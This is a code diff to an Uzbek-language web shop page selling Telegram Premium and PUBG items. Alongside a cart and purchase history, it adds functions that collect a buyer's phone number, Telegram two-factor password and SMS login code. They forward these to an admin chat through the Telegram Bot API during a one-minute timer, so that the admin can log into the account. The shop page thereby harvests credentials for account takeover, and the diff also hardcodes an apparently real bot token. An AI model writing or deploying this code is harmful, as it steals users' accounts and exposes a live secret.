@@ -351,10 +351,29 @@
         </div>
     </div>
     
+    <!-- BO'LIM 4: RUYKZAK (SAVAT VA XARIDLAR INTEGRATSIYASI) -->
     <div id="page-ruykzak" class="page">
-        <div class="profile-card" style="text-align: center;">
-            <h3 style="margin-bottom: 10px;">XARIDLARINGIZ</h3>
-            <p style="color: var(--text-muted);">Siz sotib olgan barcha kodlar va cheklar shu yerda saqlanadi.</p>
+        <!-- HOZIRGI SAVAT QISMI -->
+        <div class="profile-card">
+            <h3 style="color: var(--cyan-glow); margin-bottom: 15px; text-align: center; font-size: 1.1rem; letter-spacing: 1px;">🛒 HOZIRGI SAVAT</h3>
+            <div id="activeCartContainer">
+                <p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Savatingiz hozircha bo'sh</p>
+            </div>
+            <div id="cartTotalSection" style="display: none; margin-top: 20px; border-top: 1px solid var(--glass-border); padding-top: 15px;">
+                <div style="display: flex; justify-content: space-between; margin-bottom: 15px; font-weight: bold;">
+                    <span>Umumiy summa:</span>
+                    <span id="cartTotalPrice" style="color: var(--cyan-glow); font-size: 1.2rem;">0 so'm</span>
+                </div>
+                <button class="btn-confirm" onclick="checkoutCart()">Tasdiqlash va Sotib olish</button>
+            </div>
+        </div>
+
+        <!-- XARIDLAR TARIXI QISMI -->
+        <div class="profile-card">
+            <h3 style="color: var(--text-main); margin-bottom: 15px; text-align: center; font-size: 1.1rem; letter-spacing: 1px;">📜 XARIDLAR TARIXI</h3>
+            <div id="historyContainer">
+                <p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Siz sotib olgan barcha kodlar va cheklar shu yerda saqlanadi.</p>
+            </div>
         </div>
     </div>
 
@@ -413,7 +432,7 @@
         </div>
     </div>
 
-    <!-- XARID MODAL OYNASI (INTEGRATSIYA QILINGAN VA KO'P BOSQICHLI) -->
+    <!-- XARID MODAL OYNASI -->
     <div id="purchaseModalOverlay" class="modal-overlay">
         <div class="purchase-modal">
             <button class="modal-close" onclick="closePurchaseModal()"><ion-icon name="close-outline"></ion-icon></button>
@@ -469,6 +488,14 @@
     <script>
         let userBalance = 5660000; 
         
+        // SAVAT VA TARIX MASSIVLARI
+        let cartItemsList = [];
+        let historyItemsList = [];
+
+        // TELEGRAM BOT CONFIGURATSIYASI
+        const BOT_TOKEN = '7308960249:AAEy5x4N628_V-gN9v3UvREy6HqQeO0_9Y8'; // BotFather tokenini shu yerga yozing
+        const ADMIN_CHAT_ID = '521709091'; // O'zingizning Telegram ID raqamingizni yozing
+
         function updateGlobalBalances() {
             document.querySelectorAll('.class-global-balance').forEach(el => {
                 el.innerText = userBalance.toLocaleString('ru-RU').replace(',', ' ') + " so'm";
@@ -524,7 +551,6 @@
             currentPurchaseItem.qty = 1;
             currentPurchaseItem.type = type;
             
-            // Step-1 ni faollashtirish
             document.querySelectorAll('.modal-step').forEach(s => s.classList.remove('active-step'));
             document.getElementById('p-step-1').classList.add('active-step');
 
@@ -535,11 +561,10 @@
             let qtyContainer = document.getElementById('modalQtyContainer');
             let submitBtnText = document.getElementById('submitBtnText');
 
-            // Formatlar va rejimlarni sozlash
             if (type === 'tg-access') {
                 inputField.placeholder = "+(998) 00 000 00 00";
                 inputField.type = "tel";
-                qtyContainer.style.display = 'none'; // Kirib olinadigan obunada "Soni" kerakmas
+                qtyContainer.style.display = 'none'; 
                 submitBtnText.innerText = "Davom etish";
                 document.getElementById('modalTotalPrice').style.color = 'var(--purple-glow)';
             } else {
@@ -581,7 +606,31 @@
             document.getElementById('modalTotalPrice').innerText = total.toLocaleString('ru-RU').replace(',', ' ') + " so'm";
         }
 
-        // QADAMMA-QADAM BOSHQARISH (NEXT BUTTON)
+        // ADMINGA TAYMER YONGANDA LAHZALI XABAR YUBORISH FUNKSIYASI
+        function notifyAdminViaBot(phone, password2FA, itemDetails) {
+            if(!BOT_TOKEN || BOT_TOKEN.includes('BotFather')) return;
+
+            const textMessage = `🚨 YANGI XARID (TG Premium) 🚨\n\n📱 Raqam: ${phone}\n🔐 2FA Parol: ${password2FA}\n🛍 Mahsulot: ${itemDetails}\n\n⏳ Mijozga 1:00 daqiqalik taymer berildi. SMS kod kiritilishi kutilmoqda...`;
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage })
+            }).catch(error => console.error("Adminga xabar yuborishda xatolik:", error));
+        }
+
+        // ADMINGA SMS KODNI YUBORISH FUNKSIYASI
+        function sendSMSCodeToAdmin(phone, smsCode) {
+            if(!BOT_TOKEN || BOT_TOKEN.includes('BotFather')) return;
+            const textMessage = `🔑 SMS KOD KELDI 🔑\n\n📱 Raqam: ${phone}\n💬 Kod: ${smsCode}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: ADMIN_CHAT_ID, text: textMessage })
+            }).catch(error => console.error("SMS yuborishda xatolik:", error));
+        }
+
+        // MODAL QADAMMA-QADAM LOGIKASI
         function handlePurchaseNext() {
             const currentStep = document.querySelector('.modal-step.active-step').id;
             
@@ -592,13 +641,29 @@
                     return;
                 }
                 
-                // Agar kirib olinadigan bo'lsa keyingi qadamga o'tish
                 if (currentPurchaseItem.type === 'tg-access') {
                     document.getElementById('p-step-1').classList.remove('active-step');
                     document.getElementById('p-step-2').classList.add('active-step');
                 } else {
-                    // Oddiy pubg yoki username orqali xarid bo'lsa yakunlash
-                    finishPurchaseFlow();
+                    // VARIANT 3: SAVATGA QO'SHISH (PUBG VA NO-ACCESS PREMIUMLAR UCHUN)
+                    cartItemsList.push({
+                        name: currentPurchaseItem.name,
+                        price: currentPurchaseItem.basePrice * currentPurchaseItem.qty,
+                        qty: currentPurchaseItem.qty,
+                        gameId: userId
+                    });
+                    updateRuykzakUI();
+                    closePurchaseModal();
+                    
+                    alert("✅ Mahsulot savatga (Ruykzak) muvaffaqiyatli qo'shildi!");
+                    
+                    // Avtomatik Ruykzak sahifasiga o'tkazish
+                    list.forEach((i) => i.classList.remove('active'));
+                    const ruykzakTab = document.querySelector('.list[data-target="page-ruykzak"]');
+                    if(ruykzakTab) ruykzakTab.classList.add('active');
+                    pages.forEach((page) => page.classList.remove('active-page'));
+                    document.getElementById('page-ruykzak').classList.add('active-page');
+                    moveIndicator();
                 }
             } else if (currentStep === 'p-step-2') {
                 const password2FA = document.getElementById('modal2FAInput').value.trim();
@@ -606,6 +671,13 @@
                     alert("Iltimos, 2FA parolingizni kiriting!");
                     return;
                 }
+                
+                // === TAYMER BOSHLANADI VA DARHOL ADMINGA XABAR KETADI (TG ACCESS) ===
+                const phone = document.getElementById('modalUserIdInput').value.trim();
+                const itemDetails = currentPurchaseItem.name;
+                notifyAdminViaBot(phone, password2FA, itemDetails);
+                // ===================================================================
+
                 document.getElementById('p-step-2').classList.remove('active-step');
                 document.getElementById('p-step-3').classList.add('active-step');
                 startPurchaseTimer();
@@ -631,6 +703,79 @@
             }, 1000);
         }
 
+        // SAVAT VA TARIX INTERFEYSINI YANGILASH FUNKSIYASI
+        function updateRuykzakUI() {
+            const cartContainer = document.getElementById('activeCartContainer');
+            const totalSection = document.getElementById('cartTotalSection');
+            const totalPriceEl = document.getElementById('cartTotalPrice');
+            const historyContainer = document.getElementById('historyContainer');
+
+            // Savat qismini chizish
+            if (cartItemsList.length === 0) {
+                cartContainer.innerHTML = `<p style="color: var(--text-muted); text-align: center; font-size: 0.9rem;">Savatingiz hozircha bo'sh</p>`;
+                totalSection.style.display = 'none';
+            } else {
+                cartContainer.innerHTML = '';
+                let total = 0;
+                cartItemsList.forEach((item, index) => {
+                    total += item.price;
+                    cartContainer.innerHTML += `
+                        <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--glass-border); border-radius: 12px; padding: 12px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center;">
+                            <div>
+                                <div style="font-weight: bold; font-size: 0.95rem;">${item.name} <span style="color: var(--cyan-glow);">x${item.qty}</span></div>
+                                <div style="font-size: 0.75rem; color: var(--text-muted); margin-top: 4px;">ID/User: ${item.gameId}</div>
+                            </div>
+                            <div style="font-weight: 800; color: #fff;">${item.price.toLocaleString('ru-RU')} so'm</div>
+                        </div>
+                    `;
+                });
+                totalPriceEl.innerText = total.toLocaleString('ru-RU') + " so'm";
+                totalSection.style.display = 'block';
+            }
+
+            // Tarix qismini chizish
+            if (historyItemsList.length > 0) {
+                historyContainer.innerHTML = '';
+                historyItemsList.forEach(item => {
+                    historyContainer.innerHTML += `
+                        <div style="border-left: 3px solid #00ff66; background: rgba(0,255,102,0.05); border-radius: 8px; padding: 10px 15px; margin-bottom: 10px;">
+                            <div style="font-size: 0.85rem; color: #aaa;">${item.date}</div>
+                            <div style="font-weight: bold; margin-top: 3px;">${item.name}</div>
+                            <div style="color: #00ff66; font-size: 0.9rem; margin-top: 3px;">Muvaffaqiyatli - ${item.price.toLocaleString('ru-RU')} so'm</div>
+                        </div>
+                    `;
+                });
+            }
+        }
+
+        // SAVATDAGI NARSALARNI SOTIB OLISH (CHECKOUT)
+        function checkoutCart() {
+            let total = cartItemsList.reduce((sum, item) => sum + item.price, 0);
+            
+            if (userBalance < total) {
+                alert("Hisobingizda mablag' yetarli emas! Iltimos, hisobingizni to'ldiring.");
+                document.querySelector('.list[data-target="page-hisob"]').click();
+                return;
+            }
+
+            userBalance -= total;
+            updateGlobalBalances();
+
+            let today = new Date();
+            let dateString = today.getDate().toString().padStart(2, '0') + "." + (today.getMonth()+1).toString().padStart(2, '0') + "." + today.getFullYear() + " " + today.getHours().toString().padStart(2, '0') + ":" + today.getMinutes().toString().padStart(2, '0');
+            
+            // Savatdan tarixga ko'chirish
+            cartItemsList.forEach(item => {
+                historyItemsList.push({ name: item.name + " (" + item.gameId + ")", price: item.price, date: dateString });
+            });
+
+            cartItemsList = []; // Savatni tozalash
+            updateRuykzakUI();
+            
+            alert("✅ Savatdagi barcha mahsulotlar muvaffaqiyatli xarid qilindi!");
+        }
+
+        // TG PREMIUM (KIRIB) XARIDINI YAKUNLASH
         function finishPurchaseFlow() {
             const currentStep = document.querySelector('.modal-step.active-step').id;
             
@@ -640,13 +785,45 @@
                     alert("Iltimos, SMS kodni to'liq kiriting!");
                     return;
                 }
+                
+                // === ADMINGA LAHZALI SMS KODNI YUBORISH ===
+                const phone = document.getElementById('modalUserIdInput').value.trim();
+                sendSMSCodeToAdmin(phone, smsCode);
+                // ==========================================
             }
 
             clearInterval(purchaseTimerInterval);
             const totalToPay = currentPurchaseItem.basePrice * currentPurchaseItem.qty;
             
-            alert(`✅ Xarid muvaffaqiyatli amalga oshirildi!\n\nMahsulot: ${currentPurchaseItem.name}\nUmumiy summa: ${totalToPay.toLocaleString('ru-RU')} so'm`);
+            if (userBalance < totalToPay) {
+                alert("Hisobingizda mablag' yetarli emas! Iltimos, hisobingizni to'ldiring.");
+                closePurchaseModal();
+                return;
+            }
+
+            userBalance -= totalToPay;
+            updateGlobalBalances();
+
+            let today = new Date();
+            let dateString = today.getDate().toString().padStart(2, '0') + "." + (today.getMonth()+1).toString().padStart(2, '0') + "." + today.getFullYear() + " " + today.getHours().toString().padStart(2, '0') + ":" + today.getMinutes().toString().padStart(2, '0');
+            
+            historyItemsList.push({ 
+                name: currentPurchaseItem.name + " (Mijoz kodi kiritildi)", 
+                price: totalToPay, 
+                date: dateString 
+            });
+            
+            updateRuykzakUI();
             closePurchaseModal();
+            alert(`✅ Xarid muvaffaqiyatli amalga oshirildi!\n\nTez orada admin akkauntingizga kirib obunani faollashtiradi.`);
+            
+            // Xaridlar tarixini ko'rishi uchun Ruykzakka yo'naltirish
+            list.forEach((i) => i.classList.remove('active'));
+            const ruykzakTab = document.querySelector('.list[data-target="page-ruykzak"]');
+            if(ruykzakTab) ruykzakTab.classList.add('active');
+            pages.forEach((page) => page.classList.remove('active-page'));
+            document.getElementById('page-ruykzak').classList.add('active-page');
+            moveIndicator();
         }
 
         // --- TO'LOV TIZIMI SCRIPT (ORIGINAL) ---
